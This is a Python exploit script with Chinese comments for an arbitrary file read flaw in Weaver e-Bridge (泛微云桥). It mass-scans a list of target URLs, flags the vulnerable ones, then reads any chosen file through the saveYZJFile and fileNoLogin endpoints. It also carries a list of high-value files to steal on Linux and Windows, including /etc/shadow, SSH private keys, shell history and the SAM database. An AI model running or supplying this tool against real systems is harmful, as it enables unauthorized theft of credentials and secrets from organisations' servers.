# -*- coding: UTF-8 -*-
# author : Firbasky
#修改太空人师傅脚本
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
#解决https ssl问题


"""
泛微云桥（e-Bridge）是上海泛微公司在” 互联网 +” 的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。
影响版本
2018-2019 多个版本
"""

"""
linux下一些重要信息
/proc/net/arp
/etc/hosts 
/etc/crontab
/proc/net/fib_trie
/proc/self/cmdline
/proc/self/environ 
/proc/self/cwd
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
//ssh私钥,ssh公钥是id_rsa.pub
/root/.ssh/id_ras.keystore
//记录每个访问计算机用户的公钥
/root/.ssh/known_hosts
//记录每个访问计算机用户的公钥
/etc/passwd
/etc/shadow        //账户密码文件
/etc/my.cnf       //mysql配置文件
/etc/httpd/conf/httpd.conf   //apache配置文件
/root/.bash_history         //用户历史命令记录文件
/root/.mysql_history       //mysql历史命令记录文件
/proc/self/fd/fd[0-9]*(文件标识符)  
/proc/mounts              //记录系统挂载设备
/porc/config.gz           //内核配置文件
/var/lib/mlocate/mlocate.db          //全文件路径
"""

"""
windows下一些重要信息
C:\Program Files\mysql\my.ini //Mysql配置
C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
C:\Windows\repair\sam //存储系统初次安装的密码
C:\Program Files\mysql\my.ini //Mysql配置
C:\Windows\php.ini //php配置信息
C:\Windows\my.ini //Mysql配置信息 
C:\Windows\win.ini //Windows系统的一个基本系统配置文件
"""


def POC_1(url):
    w_poc1 = '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/Windows/win.ini&fileExt=txt'
    try:
        r = requests.get(url+w_poc1,verify=False,timeout=5)
    except Exception as e:
        print (url,'    无法连接 可能原因是因为连接波重定向或者404')
        return 0
    if 'msg' in r.text:
        r = requests.get(url+w_poc1,verify=False,timeout=5).json()["msg"]
        if r == '无法验证您的身份！':
            print (url,'    安全')
        elif '语法不正确' in r:
            l_poc1 = '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt'
            r = requests.get(url+l_poc1,verify=False,timeout=6).json()["id"]
            if r != '':
                print (url,'    系统为linux    存在漏洞！！！！！')
    elif 'id' in r.text:
        print (url,'    系统为windows    存在漏洞！！！！！')
    else:
        print (url,'    未知错误')

def POC_2(url,filename):
    exp = '/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///{}&fileExt=txt'.format(filename)
    r = requests.get(url+exp,verify=False)
    fileid = r.json()["id"]
    print(requests.get(url+"/file/fileNoLogin/{}".format(fileid)).text)

def Scan(file_name):
    with open(file_name, "r", encoding='utf8') as scan_url:
        for url in scan_url:
            if url[:4] != "http":
                url = "https://" + url
            url = url.strip('\n')
            try:
                POC_1(url)
            except Exception as e:
                print("请求报错:{e}".format(e))
                continue

if __name__ == '__main__':
    file_name  = str(input("\033[35mPlease input Attack File\nFile >>> \033[0m"))
    Scan(file_name)
    Choose = input("是否进行利用 yes or no: ")
    if Choose == "yes":
      Url = input("选择利用的Url: ")
      Filename = input("选择读的文件: ")
      POC_2(Url,Filename)
    else:
      exit()
